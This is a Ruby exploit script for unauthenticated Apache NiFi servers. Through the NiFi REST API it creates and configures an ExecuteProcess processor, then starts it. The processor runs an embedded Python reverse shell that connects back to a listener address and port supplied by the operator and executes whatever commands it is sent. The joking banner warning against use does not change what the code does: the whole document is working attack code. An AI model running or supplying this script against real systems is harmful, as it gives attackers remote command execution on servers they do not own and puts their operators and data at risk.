begin
	require 'http'
	require 'optparse'
rescue LoadError
	puts "Make sure the optparse, and http gems are installed."
	puts "gem install <gemname>"
	abort
end

options = {}

opt_parse = OptionParser.new do |opts|
	opts.banner = "Creates a reverse shell on unauthenticated NiFi applications...don't use this....ever"

	opts.on("-t", "--target TARGET", "Target url with port.  ex: http://example.com:8000") do |t|
		options[:target] = t
	end

	opts.on("-l", "--lhost LHOST", 'IP of listening host for callback') do |l|
		options[:lhost] = l
	end

	opts.on("-p", "--lport LPORT", "Port for callback") do |p|
		options[:lport] = p
	end

	opts.on("-h", "--help", "Prints this help") do
		puts opts
		exit
	end
end
opt_parse.parse!

if options.empty?
	puts opt_parse
	abort
end

begin
	opt_parse.parse!
	mandatory = [:lhost, :lport, :target]
	missing = mandatory.select{ |param| options[param].nil? }
	unless missing.empty? 
		raise OptionParser::MissingArgument.new(missing.join(', ')) 
	end
rescue OptionParser::InvalidOption, OptionParser::MissingArgument
	puts $!.to_s 
	puts opt_parse
	exit
end


TARGET = "#{options[:target]}/nifi-api"
LHOST = "#{options[:lhost]}"
LPORT = "#{options[:lport]}"

ROOT_ID = HTTP.get("#{TARGET}/process-groups/root").parse['id']

def get_version(thing)
	response = HTTP.get("#{TARGET}/processors/#{thing['id']}")
	version = response.parse['revision']['version']
end

def create_processor(name)
	processor = HTTP.post("#{TARGET}/process-groups/#{ROOT_ID}/processors",
			      :json => {
		:revision => {
			:clientId => "",      # ClientId can be empty but is a required field
			:version => 0       # On creation version will always be 0
		},
		:component => {         # Type is a standard ExecuteProcess processor
			:type => "org.apache.nifi.processors.standard.ExecuteProcess",
			:name => name,        # Name it whatever you want
			:position => {        # Where it shows up on the interface
				:x => 0,
				:y => 0
			}
		}
	}).parse
	return processor          # Redundant return call for my sanity
end

millennium_falcon = create_processor("Millennium Falcon")

def configure_processor(processor, command, command_args)
	configure = HTTP.put("#{TARGET}/processors/#{processor['id']}",
			     :json => {
		:component => {
			:id => processor["id"],
			:name => processor["component"]["name"],
			:config => {
				:concurrentlySchedulableTaskCount => "1", # Default
				:schedulingPeriod => "10 sec", # Default
				:executionNode => "ALL", # Default
				:penaltyDuration => "30 sec", # Default
				:yieldDuration => "1 sec", # Default
				:bulletinLevel => "WARN", # Default
				:schedulingStrategy => "TIMER_DRIVEN", # Default
				:comments => "", # Default
				:autoTerminatedRelationships => ['success'], # Required for standalone processor
				:properties => {
					:Command => command, # Command to run
					"Command Arguments": command_args, # Arguments to command
					"Batch Duration":"5 sec", # How often to write results
					"Redirect Error Stream":"false", # We don't care about errors
					"Argument Delimiter":"}" # Set } to argument delimeter
				} # because some arguments use
			}, # spaces
			:state => "STOPPED" # Don't start it yet
		},
		:revision => {
			:clientId => "",
			:version => get_version(processor) # Need correct version to update
		}
	}).parse
	return configure # Redundant return
end

command_args = "-c}\"import socket
import subprocess
HOST = '#{LHOST}'
PORT = #{LPORT}

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
while 1:
  data = s.recv(1024)
  proc = subprocess.Popen(data, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
  stdout_value = proc.stdout.read() + proc.stderr.read()
  s.send(stdout_value)
s.close()\""

configure_processor(millennium_falcon, "python", command_args)

def start_processor(processor)
	start_process = HTTP.put("#{TARGET}/processors/#{processor['id']}",
				 :json => {
		:revision => {
			:clientId => "",
			:version => get_version(processor)
		},
		:component => {
			:id => processor["id"],
			:state => "RUNNING"
		}
	}).parse
	return start_process
end

start_processor(millennium_falcon) # Execute python shell
sleep(1) # Gives the API some time to work
